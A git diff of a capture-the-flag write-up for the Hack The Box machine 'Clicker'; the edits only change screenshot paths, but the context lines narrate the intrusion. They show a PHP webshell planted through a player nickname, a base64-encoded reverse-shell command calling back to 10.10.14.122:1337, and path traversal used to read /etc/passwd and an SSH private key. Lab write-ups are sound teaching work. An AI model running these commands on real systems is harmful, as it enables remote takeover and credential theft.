@@ -27,7 +27,7 @@ NFS : NFS, or Network File System, serves as a cross-platform protocol designed 
 `mount -o nolock 10.10.11.232:/ /mnt/nfs_file_shares`
 `cd nfs_file_shares/mnt/backups`
 
-![](2024-01-26-15-44-05.png)
+![](/images/clicker/2024-01-26-15-44-05.png)
 
 Read-only acceptable on `/mnt` so we need move that zip to another directory
 
@@ -47,16 +47,16 @@ assets     create_player.php  diagnostic.php  exports     info.php   logout.php 
 ```
 
 
-![](2024-01-26-15-48-12.png)
+![](/images/clicker/2024-01-26-15-48-12.png)
 
 There have form register and login let's we create account and login . I've looked in `create_player.php` file Do not allow special character . 
 
 
-![](2024-01-26-15-53-15.png)
+![](/images/clicker/2024-01-26-15-53-15.png)
 
 There just appearing profile , Logout and play let's we check play first . On `play.php` is clicker also have clicks numbers and levels . Now we'll try read source code in `play.php` 
 
-![](2024-01-26-16-17-40.png)
+![](/images/clicker/2024-01-26-16-17-40.png)
 
 in `play.php` can modify your role user to superuser
 
@@ -154,7 +154,7 @@ Upgrade-Insecure-Requests: 1
 Go back to index.php  to see if anything has changed but ... is not changed lol
 we try relogin and we got access Administration Portal XD
 
-![](2024-01-26-16-22-21.png)
+![](/images/clicker/2024-01-26-16-22-21.png)
 
 Administration was appended now we've privilege user to superuser
 
@@ -163,14 +163,14 @@ Go to Administration and we try export it
 
 ### Manipulation export file
 
-![](2024-01-27-00-15-06.png)
+![](/images/clicker/2024-01-27-00-15-06.png)
 Look here. I've shown you two tabs for browsers. There were only exports for the top players; Clicker only appeared. After I exported it, it was automatically saved as a txt file, and there were shown the directory name and file name.There are 3 extensions to save: `txt`, `json`, and `html`. Now let's export it with Capture in Burpsuite. 
 
-![](2024-01-27-00-23-18.png)
+![](/images/clicker/2024-01-27-00-23-18.png)
 
 Look at the request on parameter 'extension'. There was a txt extension. I'll try changing the extension from txt to php because this website uses PHP, so I just want to see if it's working or not. So now I've changed `txt` to `php` and it was saved as php.
 
-![](2024-01-27-00-34-07.png)
+![](/images/clicker/2024-01-27-00-34-07.png)
 
 
 ### Create nickname malicious php code
@@ -221,14 +221,14 @@ just we dont need bypass because role only need bypass because something prevent
 
 Now check in leaderboard
 
-![](2024-01-27-12-18-43.png)
+![](/images/clicker/2024-01-27-12-18-43.png)
 
 Look here my name is blank because i've added php code malicious so now i'll change extension to php
 
 
 ### Remote Code Execution
 
-![](2024-01-27-12-21-25.png)
+![](/images/clicker/2024-01-27-12-21-25.png)
 
 Add `&cmd=$COMMAND` because the webshell code is used `$GET_` cmd
 
@@ -244,7 +244,7 @@ With url encode
 echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIyLzEzMzcgMD4mMQ==%22%20|%20base64%20-d%20|%20bash
 ```
 
-![](2024-01-27-12-25-24.png)
+![](/images/clicker/2024-01-27-12-25-24.png)
 
 There is base64 decode so to create a revshell payload you can generate here [Revshells](https://www.revshells.com/)
 Change `bash` to `sh` 
@@ -297,21 +297,21 @@ Use the binary to execute the following task:
 
 there is option to using the tools but no one option how to read the file because we need find the priv8 key
 
-![](2024-01-27-12-51-37.png)
+![](/images/clicker/2024-01-27-12-51-37.png)
 
 I know now option number above 5 is using for read a file so now we can get priv8 keys jack because `execute_query` have permission as jack , but it's not working so i think we can read file with directory traversal lets we try
 
 
 `./execute_query 5 ../../../etc/passwd`
 
-![](2024-01-27-12-56-23.png)
+![](/images/clicker/2024-01-27-12-56-23.png)
 
 It's worked and there can read the `/etc/passwd` file so now we just try to get ssh key 
 
 
 `./execute_query 5 ../.ssh/id_rsa`
 
-![](2024-01-27-12-57-40.png)
+![](/images/clicker/2024-01-27-12-57-40.png)
 
 I've got priv8 key jack so now we just login
 
@@ -327,7 +327,7 @@ The `id_rsa` it's error let's we check . We need to remove ----- on id_rsa and r
 
 `ssh -i id_rsa jack@clicker.htb`
 
-![](2024-01-27-13-07-59.png)
+![](/images/clicker/2024-01-27-13-07-59.png)
 
 Successfully login now we try run `sudo -l` to see jack have permision root or not
 
@@ -367,7 +367,7 @@ fi
 ```
 After many inspections, I noticed that this file actually calls /usr/bin/echo and /usr/bin/xml_pp. /usr/bin/echo is a binary file and nothing special. But /usr/bin/xml_pp is using Perl script to run.
 
-![](2024-01-27-16-04-40.png)
+![](/images/clicker/2024-01-27-16-04-40.png)
 
 There script are using perl . The vulnerability is `perl_startup` also we can execute this script with with root privileges , We can using perl_startup to execute command with root access
 
